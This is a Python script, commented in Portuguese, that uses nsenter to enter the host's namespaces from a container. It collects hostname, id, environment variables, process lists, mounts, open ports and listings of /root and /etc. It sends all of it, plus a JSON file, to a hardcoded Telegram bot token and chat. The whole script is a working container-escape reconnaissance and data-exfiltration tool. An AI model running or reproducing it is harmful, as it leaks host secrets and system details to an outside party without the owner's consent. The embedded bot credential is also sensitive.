#!/usr/bin/env python3
"""
Script de coleta de dados via nsenter – sem forçar acesso a arquivos bloqueados.
"""

import subprocess
import json
import requests
import os
import sys
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

def run(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def collect():
    data = {}
    # Comandos via nsenter
    cmds = {
        "hostname": "hostname",
        "id": "id",
        "env": "env",
        "ps": "ps auxfww",
        "mount": "mount",
        "df": "df -h",
        "netstat": "netstat -tulpn 2>/dev/null || ss -tulpn",
        "ls_root": "ls -la /root/ 2>/dev/null || echo 'N/A'",
        "ls_etc": "ls -la /etc/ 2>/dev/null || echo 'N/A'",
        "cat_hostname": "cat /etc/hostname 2>/dev/null || echo 'N/A'",
        "cat_resolv": "cat /etc/resolv.conf 2>/dev/null || echo 'N/A'",
    }
    for key, cmd in cmds.items():
        full_cmd = f"nsenter -t 1 -m -u -i -n sh -c '{cmd}' 2>/dev/null || echo 'FALHA'"
        data[key] = run(full_cmd)
    return data

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        r = requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=10)
        print(f"[+] Telegram: {r.status_code}")
    except Exception as e:
        print(f"[-] Erro: {e}")

def main():
    send_telegram("🚀 **Coleta de dados via nsenter**")
    data = collect()
    for key, value in data.items():
        send_telegram(f"📄 **{key}**\n```\n{value[:500]}\n```")
    # Salva localmente
    filename = f"data_{int(datetime.now().timestamp())}.json"
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    # Envia o arquivo (se possível)
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        files = {'document': open(filename, 'rb')}
        requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": "📁 Dados completos"}, timeout=30)
    except:
        pass
    send_telegram("✅ **Coleta finalizada.**")

if __name__ == "__main__":
    main()
